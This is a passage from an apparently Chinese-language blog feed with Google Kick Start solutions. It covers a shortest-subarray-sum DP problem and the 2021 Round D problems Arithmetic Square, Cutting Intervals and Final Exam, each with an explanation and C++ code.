<h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/00000000004362d6/00000000008b44ef">https://codingcompetitions.withgoogle.com/kickstart/round/00000000004362d6/00000000008b44ef</a></p>
<h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p> 数组</p>
</blockquote>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol>
<li>这个题目虽然不是很难, 但是感觉出的非常好.题目要求找到最多两个非重复的连续子序列的和等于 $k$ 的最短长度,我们设 $dp[i]$ 表示连续子序列的和等于 $i$ 的最短长度.</li>
<li>我们每次从 $i$ 开始往后遍历, 找到从 $i$ 到 $n$ 的连续子序列的和等于 $x$ 的最短长度. 我们从 $i$ 往前开始往前遍历,依次遍历每一个截至到 $i$ 的连续子序列的和 $curr$ ,同时我们从 $i+1$ 往后找到 $dp[k-curr]$.<br><img src="https://i.loli.net/2021/10/27/fg5rpOQyvUw3iIc.png"><br>我们找到递推公式如下:<br>$$ dp[k] &#x3D; min(dp[k], x + d[k-i])$$</li>
<li>复杂度分析:</li>
</ol>
<ul>
<li>时间复杂度分析: 时间复杂度为 $O(n\times k)$ , 其中 $n$ 为数组的长度, $k$ 为目标要求的和.</li>
<li>空间复杂度分析: 空间复杂度为$O(k)$．</li>
</ul>
<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slove</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,k;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; arr;</span><br><span class="line"></span><br><span class="line">    cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">    arr = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        cin&gt;&gt;arr[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(k+<span class="number">1</span>,n+<span class="number">1</span>)</span></span>;</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> curr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = i; j &gt;= <span class="number">0</span>; --j) &#123;</span><br><span class="line">            curr += arr[j];</span><br><span class="line">            <span class="keyword">if</span>(curr &lt;= k) &#123;</span><br><span class="line">                dp[k] = <span class="built_in">min</span>(dp[k],dp[k-curr]+i+<span class="number">1</span>-j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        curr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = i; j &lt; n; ++j) &#123;</span><br><span class="line">            curr += arr[j];</span><br><span class="line">            <span class="keyword">if</span>(curr &lt;= k)&#123;</span><br><span class="line">                dp[curr] = <span class="built_in">min</span>(dp[curr],j+<span class="number">1</span>-i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;t&lt;&lt;<span class="string">&quot;: &quot;</span>;</span><br><span class="line">    cout&lt;&lt;(dp[k] &gt; n ? <span class="number">-1</span> : dp[k])&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">slove</span>(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>kickstart</tag>
      </tags>
  </entry>
  <entry>
    <title>【kickstart】 kickstart 2021 roundD </title>
    <url>/2022/11/20/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/64/</url>
    <content><![CDATA[<h1 id="kickstart-2021-roundD"><a href="#kickstart-2021-roundD" class="headerlink" title="kickstart 2021 roundD"></a>kickstart 2021 roundD</h1><p><code>kick start</code>的题目质量非常高，感觉前三题没有问题，自己可以确定前三题做出来。前两题做出来了，后来因为有事，三四题就没有做。第三题不用看解答就能干出来。<br><img src="https://i.loli.net/2021/07/16/K4dX5Q7H2qkVMEr.png"></p>
<h2 id="Arithmetic-Square"><a href="#Arithmetic-Square" class="headerlink" title="Arithmetic Square"></a>Arithmetic Square</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><img src="https://i.loli.net/2021/07/14/fZaIpsXUNkRwHCv.png"></p>
<h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/00000000004361e3/000000000082b813">https://codingcompetitions.withgoogle.com/kickstart/round/00000000004361e3/000000000082b813</a></p>
<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p>  暴力</p>
</blockquote>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
<li>第一题比较简单，大意就是给定一个<code>3x3</code>的矩阵，求问修改最中间的数，使得上下和对角线的三个数字组成的等差序列最多。暴力尝试所有可能的等差数列即可。</li>
</ol>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slove</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> curr = <span class="number">0</span>;</span><br><span class="line">    map&lt;<span class="type">int</span>,<span class="type">int</span>&gt; cnt;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">matrix</span>(<span class="number">3</span>,<span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(<span class="number">3</span>));</span><br><span class="line">    cin&gt;&gt;matrix[<span class="number">0</span>][<span class="number">0</span>]&gt;&gt;matrix[<span class="number">0</span>][<span class="number">1</span>]&gt;&gt;matrix[<span class="number">0</span>][<span class="number">2</span>];</span><br><span class="line">    cin&gt;&gt;matrix[<span class="number">1</span>][<span class="number">0</span>]&gt;&gt;matrix[<span class="number">1</span>][<span class="number">2</span>];</span><br><span class="line">    cin&gt;&gt;matrix[<span class="number">2</span>][<span class="number">0</span>]&gt;&gt;matrix[<span class="number">2</span>][<span class="number">1</span>]&gt;&gt;matrix[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span>((matrix[<span class="number">0</span>][<span class="number">1</span>] - matrix[<span class="number">0</span>][<span class="number">0</span>]) == (matrix[<span class="number">0</span>][<span class="number">2</span>] - matrix[<span class="number">0</span>][<span class="number">1</span>])) ans++;</span><br><span class="line">    <span class="keyword">if</span>((matrix[<span class="number">2</span>][<span class="number">1</span>] - matrix[<span class="number">2</span>][<span class="number">0</span>]) == (matrix[<span class="number">2</span>][<span class="number">2</span>] - matrix[<span class="number">2</span>][<span class="number">1</span>])) ans++;</span><br><span class="line">    <span class="keyword">if</span>((matrix[<span class="number">1</span>][<span class="number">0</span>] - matrix[<span class="number">0</span>][<span class="number">0</span>]) == (matrix[<span class="number">2</span>][<span class="number">0</span>] - matrix[<span class="number">1</span>][<span class="number">0</span>])) ans++;</span><br><span class="line">    <span class="keyword">if</span>((matrix[<span class="number">1</span>][<span class="number">2</span>] - matrix[<span class="number">0</span>][<span class="number">2</span>]) == (matrix[<span class="number">2</span>][<span class="number">2</span>] - matrix[<span class="number">1</span>][<span class="number">2</span>])) ans++;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> a = matrix[<span class="number">1</span>][<span class="number">2</span>] - matrix[<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span>(a%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">        cnt[a/<span class="number">2</span> + matrix[<span class="number">1</span>][<span class="number">0</span>]]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> b = matrix[<span class="number">2</span>][<span class="number">1</span>] - matrix[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span>(b%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">        cnt[b/<span class="number">2</span> + matrix[<span class="number">0</span>][<span class="number">1</span>]]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> c = matrix[<span class="number">2</span>][<span class="number">2</span>] - matrix[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span>(c%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">        cnt[c/<span class="number">2</span> + matrix[<span class="number">0</span>][<span class="number">0</span>]]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> d = matrix[<span class="number">2</span>][<span class="number">0</span>] - matrix[<span class="number">0</span>][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span>(d%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">        cnt[d/<span class="number">2</span> + matrix[<span class="number">0</span>][<span class="number">2</span>]]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> v : cnt)&#123;</span><br><span class="line">        curr = <span class="built_in">max</span>(curr,v.second);</span><br><span class="line">    &#125;</span><br><span class="line">    ans += curr;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;t&lt;&lt;<span class="string">&quot;: &quot;</span>;</span><br><span class="line">    cout&lt;&lt;ans;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">slove</span>(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Cutting-Intervals"><a href="#Cutting-Intervals" class="headerlink" title="Cutting Intervals"></a>Cutting Intervals</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p><img src="https://i.loli.net/2021/07/14/r3pNfjUB9gtw6TE.png"></p>
<h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/00000000004361e3/000000000082b933">https://codingcompetitions.withgoogle.com/kickstart/round/00000000004361e3/000000000082b933</a></p>
<h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p> 差分数组 + 贪心</p>
</blockquote>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol>
<li>给定一系列的二维空间中的线段，在限定的切割操作中，求问最多可以把这些线段切成多少段？</li>
<li>我们可以参考线段的切割情况如下：<br><img src="https://i.loli.net/2021/07/16/uNaOd3vMG4fDtXi.png"><br>我们可以看到可以利用查分数组，即可计算连续的区间内每切一次可以增加多少条线段，我们设区间$[x,y]$总共有<code>d</code>条线段重合，则我们首先可以知道在区间$[x+1,y-1]$我们每切割一次则可以增加<code>d</code>条线段，但在区间两个端点处需要特殊处理，我们此时需要判断在点$y$处需要特殊处理，因为端点处；我们首先讲可以进行切割的区间加入到待选队列中，并按照重合的次数进行排序。但是我们需要注意的是区间的右端点，需要将右端点为结束端点的线段去掉。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|__|__|________|  |        |     | </span><br><span class="line">|  |  |________|__|________|     |</span><br><span class="line">|  |——|————————|——|        |     |</span><br><span class="line">|  |  |        |__|________|_____|</span><br><span class="line">1  2  3        6  7        10    12</span><br></pre></td></tr></table></figure></li>
<li>如上图所示，我们可以看到在区间<code>[1,2]</code>之间只有1条线段重合，在区间<code>[2,3]</code>之间有两条线段重合，在区间<code>[3,6]</code>之间只有3条线段重合，<code>[6,7]</code>之间有3条线段重合，<code>[7,10]</code>之间有两条线段重合，<code>[10,12]</code>之间有两条线段重合。我们知道区间分布如下：</li>
</ol>
<ul>
<li><code>[1,2]</code>无法分割。</li>
<li><code>[2,3]</code>无法分割。</li>
<li><code>[3,6]</code>在<code>(4,5)</code>处每分割一次即可增加3个线段但在<code>6</code>处进行分割只能增加两条线段。</li>
<li><code>[7，10]</code>在(8,9)处分割每分割一次即可增加2个线段，但在<code>10</code>分割只能增加<code>1</code>个线段</li>
<li><code>[10,12]</code>在(11)处分割每分割一次即可增加<code>1</code>个线段，但在<code>12</code>处无法分割。</li>
</ul>
<ol start="4">
<li>我们利用查分数组很快即可以计算出每个区间内重叠的线段的次数，并按照次数的大小进行排序即可，我们使用贪心策略，每次选取分割区间最大的点即可。</li>
</ol>
<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slove</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> n,c;</span><br><span class="line">    map&lt;<span class="type">long</span> <span class="type">long</span>,<span class="type">int</span>&gt; prev;</span><br><span class="line">    map&lt;<span class="type">long</span> <span class="type">long</span>,<span class="type">int</span>&gt; arrl;</span><br><span class="line">    map&lt;<span class="type">long</span> <span class="type">long</span>,<span class="type">int</span>&gt; arrr;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;c;</span><br><span class="line">    <span class="comment">// 查分数组</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> l,r;</span><br><span class="line">        cin&gt;&gt;l&gt;&gt;r;</span><br><span class="line">        prev[l]++;</span><br><span class="line">        prev[r]--;</span><br><span class="line">        arrl[l]++;</span><br><span class="line">        arrr[r]++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ans = n;</span><br><span class="line">    map&lt;<span class="type">long</span> <span class="type">long</span>,<span class="type">long</span> <span class="type">long</span>&gt; arr;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> left = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> curr = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 记录左端点与右端点</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> v : prev)&#123;</span><br><span class="line">        <span class="keyword">if</span>(curr == <span class="number">0</span>)&#123;</span><br><span class="line">            left = v.first;</span><br><span class="line">            curr += v.second;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            arr[curr] += v.first - left - <span class="number">1</span>;</span><br><span class="line">            arr[curr-arrr[v.first]]++;</span><br><span class="line">            left = v.first;</span><br><span class="line">            curr += v.second;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 贪心策略每次取切割可以得到的最大线段的点</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> it = arr.<span class="built_in">rbegin</span>(); it != arr.<span class="built_in">rend</span>(); it++)&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> x = <span class="built_in">min</span>(c,it-&gt;second);</span><br><span class="line">        ans += x*it-&gt;first;</span><br><span class="line">        c -= x;</span><br><span class="line">        <span class="keyword">if</span>(c &lt;= <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;t&lt;&lt;<span class="string">&quot;: &quot;</span>;</span><br><span class="line">    cout&lt;&lt;ans;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">slove</span>(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Final-Exam"><a href="#Final-Exam" class="headerlink" title="Final Exam"></a>Final Exam</h2><p><img src="https://i.loli.net/2021/07/14/UkblX734ZqG61JF.png"></p>
<h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/00000000004361e3/000000000082bffc">https://codingcompetitions.withgoogle.com/kickstart/round/00000000004361e3/000000000082bffc</a></p>
<h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p> 二分查找</p>
</blockquote>
<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol>
<li>感觉第三题要比第二题简单许多，就是一个典型的二分查找的应用即可。我们知道给定难度<code>P</code>,则我们知道绝对值最小值得点肯定在距离点<code>p</code>最近的两个区间，我们利用二分查找，查找距离点<code>p</code>最近的两个区间$[l_{1},r_{1}],[l_{2},r_{2}]$且满足$l_{1}\le r_{1}\le l_{2}\le r_{2}$，如果点<code>p</code>在区间$[l_{1},r_{1}]$范围内，则我们可以知道当前最小的绝对值为<code>0</code>，则我们将<code>p</code>从区间内取出，并将原有区间$[l_{1},r_{1}]$划分为两个新的区间$[l_{1},p-1],[p+1,r_{1}]$,并将这两个新的区间加入到待选序列中。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">________  |    __________</span><br><span class="line">[l1,r1]  p       [l2,r2]</span><br></pre></td></tr></table></figure></li>
<li>如果不在区间内，则肯定距离<code>p</code>最近的点要么为$r_{1},l_{2}$,则我们优先从这两个点中选择距离最近的点即可，假设$r_{1}$距离点<code>p</code>最近，则我们将$r_{1}$从区间内取出，然后再更新区间为$[l_{1},r_{1}-1]$.</li>
</ol>
<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slove</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,m;</span><br><span class="line">    map&lt;LL,LL&gt; pb;</span><br><span class="line">    vector&lt;LL&gt; ans;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    vector&lt;LL&gt; arr = <span class="built_in">vector</span>&lt;LL&gt;(m);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        LL a,b;</span><br><span class="line">        cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">        pb[b] = a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i)&#123;</span><br><span class="line">        cin&gt;&gt;arr[i];</span><br><span class="line">        <span class="keyword">auto</span> it = pb.<span class="built_in">lower_bound</span>(arr[i]);</span><br><span class="line">        <span class="keyword">if</span>(it == pb.<span class="built_in">end</span>())&#123;</span><br><span class="line">            it--;</span><br><span class="line">            ans.<span class="built_in">push_back</span>(it-&gt;first);</span><br><span class="line">            LL a = it-&gt;first;</span><br><span class="line">            LL b = it-&gt;second;</span><br><span class="line">            pb.<span class="built_in">erase</span>(a);</span><br><span class="line">            a--;</span><br><span class="line">            <span class="keyword">if</span>(a &gt;= b) pb[a] = b;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            LL a = it-&gt;first;</span><br><span class="line">            LL b = it-&gt;second;</span><br><span class="line">            <span class="keyword">if</span>(it-&gt;second &gt; arr[i])&#123;</span><br><span class="line">                <span class="keyword">if</span>(it == pb.<span class="built_in">begin</span>())&#123;</span><br><span class="line">                    ans.<span class="built_in">push_back</span>(b);</span><br><span class="line">                    b++;</span><br><span class="line">                    pb.<span class="built_in">erase</span>(a);</span><br><span class="line">                    <span class="keyword">if</span>(b &lt;= a) pb[a] = b;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    it--;</span><br><span class="line">                    LL c = it-&gt;first;</span><br><span class="line">                    LL d = it-&gt;second;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="built_in">abs</span>(arr[i]-c) &gt; <span class="built_in">abs</span>(arr[i] - b))&#123;</span><br><span class="line">                        ans.<span class="built_in">push_back</span>(b);</span><br><span class="line">                        b++;</span><br><span class="line">                        pb.<span class="built_in">erase</span>(a);</span><br><span class="line">                        <span class="keyword">if</span>(b &lt;= a) pb[a] = b;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        ans.<span class="built_in">push_back</span>(c);</span><br><span class="line">                        pb.<span class="built_in">erase</span>(c);</span><br><span class="line">                        c--;</span><br><span class="line">                        <span class="keyword">if</span>(d &lt;= c) pb[c] = d;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;                </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                ans.<span class="built_in">push_back</span>(arr[i]);</span><br><span class="line">                LL c = arr[i] - <span class="number">1</span>;</span><br><span class="line">                LL d = arr[i] + <span class="number">1</span>;</span><br><span class="line">                pb.<span class="built_in">erase</span>(a);</span><br><span class="line">                <span class="keyword">if</span>(c &gt;= b) pb[c] = b;</span><br><span class="line">                <span class="keyword">if</span>(d &lt;= a) pb[a] = d;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;t&lt;&lt;<span class="string">&quot;: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; ans.<span class="built_in">size</span>(); ++i)&#123;</span><br><span class="line">        cout&lt;&lt;ans[i]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">slove</span>(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
